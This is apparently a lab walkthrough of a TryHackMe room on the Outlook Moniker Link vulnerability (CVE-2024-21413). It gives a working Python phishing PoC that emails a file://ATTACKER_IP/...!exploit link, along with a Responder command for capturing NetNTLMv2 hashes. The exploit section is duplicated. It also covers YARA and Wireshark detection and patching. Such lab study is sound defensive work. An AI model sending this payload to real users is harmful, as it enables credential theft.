# üß® TryHackMe - Moniker Link Exploitation (CVE-2024-21413)

This document outlines the TryHackMe room walkthrough for exploiting a critical vulnerability in Microsoft Outlook ‚Äî **CVE-2024-21413**, known as the Moniker Link vulnerability. It enables attackers to exfiltrate NTLM hashes and potentially perform remote code execution by bypassing Outlook's Protected View feature.

---

## üìå Task 1: Introduction

On **February 13, 2024**, Microsoft disclosed **CVE-2024-21413**, a vulnerability affecting Microsoft Outlook that allows attackers to bypass Outlook's Protected View and exfiltrate user **NTLM hashes**.

The vulnerability leverages a special type of hyperlink called a **Moniker Link**, which triggers Windows-based components when clicked. When crafted maliciously, it can initiate an **SMB authentication request** from the victim to the attacker's server.

| Field | Detail |
|-------|--------|
| **CVE ID** | CVE-2024-21413 |
| **Disclosed by** | Haifei Li (Check Point Research) |
| **Impact** | Credential Leak, Remote Code Execution (RCE) |
| **Severity** | Critical |
| **CVSS Score** | 9.8 |
| **Attack Complexity** | Low |
| **Affected** | Office LTSC 2021, Microsoft 365 Apps, Office 2019, Office 2016 |
| **Reference** | [Microsoft CVE Page](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2024-21413) |

### üéØ Learning Objectives

### üîê Virtual Machine Access Credentials

Use the following credentials to log into the vulnerable machine provided in this room:

![TryHackMe Credentials](https://github.com/user-attachments/assets/ae5ed391-546c-41d7-af7f-990a7983b205)


- Understand how Moniker Links work and bypass Outlook‚Äôs security
- Leak NTLM hashes using crafted hyperlinks
- Detect the exploit using YARA/PCAP
- Learn how to mitigate the issue

---

## üîé Task 2: Vulnerability Deep Dive

Microsoft Outlook supports rendering emails in HTML and can handle various hyperlinks including `http`, `https`, and `file://`. The vulnerability lies in how Outlook handles **file:// Moniker Links**.

### üîí What is Protected View?

![Outlook Protected View Warning](https://github.com/user-attachments/assets/fabdd20b-34f2-4351-8692-92aecc0b5de7)

> Example of Outlook's default behavior when opening hyperlinks from untrusted sources.  
> This dialog is often bypassed using the Moniker Link `!` trick.


Protected View is a security mechanism in Outlook designed to sandbox content from unknown or external sources (e.g., links or macros). It usually prevents suspicious links from being automatically opened.

### üß® Bypass via Moniker Link

An attacker can craft a Moniker Link that includes a `!` (exclamation mark) and additional characters to **bypass Protected View**.

#### üìÇ Example Payload

```html
<a href="file://ATTACKER_IP/share!exploit">Click me</a>
```

- This causes the victim's system to attempt authentication with the attacker‚Äôs SMB server.
- The **NTLMv2 hash** of the victim‚Äôs credentials is sent automatically.
- No user interaction is required beyond clicking the link.

Note: While the CVE has RCE potential through Windows COM object abuse, no public PoC currently exists for that part.

---

## üí• Task 3: Exploitation

### ‚öôÔ∏è Step-by-Step Exploit

1. **Start Responder** on the AttackBox:
   ```bash
   sudo responder -I ens5
   ```
   ![AttackBox Launch](https://github.com/user-attachments/assets/c6e770fc-576f-45fd-8597-fa95af53c080)

   *Launching Responder on the AttackBox to listen for incoming SMB authentication requests*

2. **Create PoC Script** to Send Email

   ![Writing Exploit Script](https://assets.tryhackme.com/additional/CVE-2024-21410/abcopypaste.gif)
   *Writing the PoC email script.*

   ```python
   from email.mime.text import MIMEText
   from email.mime.multipart import MIMEMultipart
   import smtplib

   sender_email = "attacker@monikerlink.thm"
   receiver_email = "victim@monikerlink.thm"
   password = "attacker"

   html_content = '''<a href="file://ATTACKER_IP/test!exploit">Click me</a>'''

   msg = MIMEMultipart()
   msg["Subject"] = "CVE-2024-21413"
   msg["From"] = "attacker"
   msg["To"] = receiver_email
   msg.attach(MIMEText(html_content, 'html'))

   server = smtplib.SMTP('MACHINE_IP', 25)
   server.login(sender_email, password)
   server.sendmail(sender_email, [receiver_email], msg.as_string())
   server.quit()
   ```

3. **Configure Script Parameters**
   - Replace `ATTACKER_IP` with your AttackBox IP.
   - Replace `MACHINE_IP` with the IP of the vulnerable mail server.

   ![Attacker IP Terminal](https://github.com/user-attachments/assets/2108f1b3-c023-49f6-b234-7789f050f170)
   *Checking the AttackBox IP address before executing the exploit*

4. **Run the script** to deliver the malicious email:
   ```bash
   python3 exploit.py
   ```

5. **On Victim Machine**
   - Open Outlook.

   ![Outlook Sign-In](https://github.com/user-attachments/assets/50b888c3-151c-4cca-a27f-d6575030077f)
   *Outlook sign-in screen upon launch*

   ![Product Key Prompt](https://github.com/user-attachments/assets/db99b2d6-62b0-4a10-9ba5-9b801c040d7e)
   *The product key prompt can be ignored and closed*

   ![Outlook Ready](https://github.com/user-attachments/assets/46bb936b-43bc-4148-925a-caf2f3c03f52)
   *The default mailbox setup has been completed*

   - Find and click the "Click me" hyperlink in the received email.

   ![Victim Email](https://github.com/user-attachments/assets/3f022976-e540-40c6-9608-36e11ccfaccd)
   *The victim‚Äôs Outlook displaying the malicious email sent by the attacker*

6. **Observe Responder Output**
   - If successful, the **netNTLMv2 hash** will appear in your terminal.

   ![Responder Hash Captured](https://github.com/user-attachments/assets/74b3821b-4037-40d6-973c-c9c656c954eb)
   *Responder capturing the victim‚Äôs hash*

### ‚öôÔ∏è Step-by-Step Exploit

1. **Start Responder** on the AttackBox:
   ```bash
   sudo responder -I ens5
   ```

2. **Create PoC Script** to Send Email

```python
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import smtplib

sender_email = "attacker@monikerlink.thm"
receiver_email = "victim@monikerlink.thm"
password = "attacker"

html_content = '''<a href="file://ATTACKER_IP/test!exploit">Click me</a>'''

msg = MIMEMultipart()
msg["Subject"] = "CVE-2024-21413"
msg["From"] = "attacker"
msg["To"] = receiver_email
msg.attach(MIMEText(html_content, 'html'))

server = smtplib.SMTP('MACHINE_IP', 25)
server.login(sender_email, password)
server.sendmail(sender_email, [receiver_email], msg.as_string())
server.quit()
```

3. **Configure Script Parameters**
   - Replace `ATTACKER_IP` with your AttackBox IP.
   - Replace `MACHINE_IP` with the IP of the vulnerable mail server.

4. **Run the script** to deliver the malicious email:
   ```bash
   python3 exploit.py
   ```

5. **On Victim Machine**
   - Open Outlook.
   - Find and click the "Click me" hyperlink in the received email.

6. **Observe Responder Output**
   - If successful, the **netNTLMv2 hash** will appear in your terminal.

---

## üß™ Task 4: Detection

### üîç YARA Rule

```yara
rule EXPL_CVE_2024_21413_Microsoft_Outlook_RCE_Feb24 {
   meta:
      description = "Detects Moniker Link exploitation for CVE-2024-21413"
      author = "Florian Roth"
      date = "2024-02-17"

   strings:
      $filelink = /file:\/\/[^"']+!/

   condition:
      filesize < 1000KB and $filelink
}
```

### üì° Network Detection

### üß™ Wireshark Packet Capture

Below is a screenshot of Wireshark showing the SMB authentication attempt and the victim‚Äôs NTLMv2 hash being sent to the attacker:

![Wireshark NTLMv2](https://github.com/user-attachments/assets/121fa8dd-5705-4473-ba42-46e160a31349)


Using **Wireshark**, filter for:
```
smb2 && ip.addr == VICTIM_IP
```
You‚Äôll observe SMB negotiation packets containing hashed credentials.

---

## üîê Task 5: Remediation

### ‚úÖ Patch Immediately

Microsoft released patches in **February 2024 Patch Tuesday**. Updating Office through Windows Update or Microsoft Update Catalog is essential.

### üìå Security Best Practices

- Train users not to click unknown or suspicious links
- Implement link preview and reporting mechanisms
- Consider **blocking outbound SMB traffic** at the network level if applicable

Note: Protected View bypass cannot be mitigated via Outlook settings alone.

---

## üèÅ Task 6: Conclusion

This vulnerability poses a significant risk due to:
- Wide software adoption (Outlook)
- Ease of exploitation
- Stealthy credential leak

üõ°Ô∏è Apply all available patches  
üß† Educate users about phishing links  
üîç Monitor network for SMB/NTLM authentication attempts

Stay updated, stay safe.

---

**Author**: CMNatic  
**PoC Repo**: [GitHub - CMNatic/CVE-2024-21413](https://github.com/cmnatic)
